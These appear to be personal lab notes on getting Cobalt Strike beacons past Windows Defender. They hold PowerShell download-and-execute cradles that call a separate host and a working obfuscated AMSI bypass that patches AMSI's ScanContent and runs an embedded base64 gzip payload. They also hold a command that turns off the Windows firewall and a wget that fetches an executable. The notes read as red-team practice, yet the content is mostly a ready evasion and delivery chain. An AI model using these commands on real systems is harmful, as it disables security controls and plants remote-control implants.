
![[Pasted image 20250130193320.png]]
hosted
![[Pasted image 20250130193419.png]]
payload
`iex(iwr http://192.168.179.129/haha -useb)`

blocked by defender
***In order to have this not happend again need to work with an early screenshot of windows that hasnt detected everything yet or nothing will work***
![[Pasted image 20250130193643.png]]
testing again with the `compress.ps1` that worked previously - the other was missing a space or wsomehting
`iex(iwr http://192.168.179.129/haha2 -useb)`
- the iex is being detected, need to find another way to execute it

test amsi with new variables - this works as a new `amsi`
```bash
class TrollAMSI{static [int] M([string]$sleepy, [string]$sleeper){return 1}}
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1);$tiredofthis=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($tiredofthis,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
payload to execute `resource kit`
`iex(iwr http://192.168.179.129/please -useb)`

proof that the beacons work with defender off and firewall off
![[Pasted image 20250130204158.png]]
cobalt proof
![[Pasted image 20250130204233.png]]
firewall off
`netsh advfirewall set allprofiles state off`
#### Artifact kit test
```bash
PS C:\Users\blaster\Desktop\malware> wget http://192.168.179.129:80/testing -UseBasicP -OutFile "C:\Users\blaster\Desktop\testing.exe"     

http://192.168.179.129:80/testing
```
working 